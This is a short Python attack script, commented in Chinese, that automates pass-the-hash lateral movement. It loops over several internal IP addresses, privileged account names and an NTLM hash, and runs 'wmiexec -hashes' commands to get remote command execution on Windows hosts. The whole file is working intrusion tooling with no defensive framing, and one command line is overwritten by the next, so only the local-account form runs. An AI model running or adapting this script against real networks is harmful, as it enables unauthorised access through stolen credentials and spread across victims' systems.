import os,time
 # HASH传递批量利用，ip/用户名/hash 多变量遍历
ips={
'192.168.3.21',
'192.168.3.25',
'192.168.3.29',
'192.168.3.30',
'192.168.3.32'
}
 
users={
'Administrator',
'boss',
'dbadmin',
'fileadmin',
'mack',
'mary',
'webadmin'
}
 
hashs={
#'ccef208c6485269c20db2cad21734fe7',
'518b98ad4178a53695dc997aa02d455c'
}
 
for ip in ips:
    for user in users:
        for mimahash in hashs:
            #域用户和本地用户都试试
            #wmiexec -hashes :hash god/user@ip whoami
            #wmiexec -hashes :hash ./user@ip whoami
            exec = "wmiexec -hashes :"+mimahash+" god/"+user+"@"+ip+" whoami"
            exec = "wmiexec -hashes :"+mimahash+" ./"+user+"@"+ip+" whoami"
            print('--->' + exec + '<---')
            os.system(exec)
            time.sleep(0.5)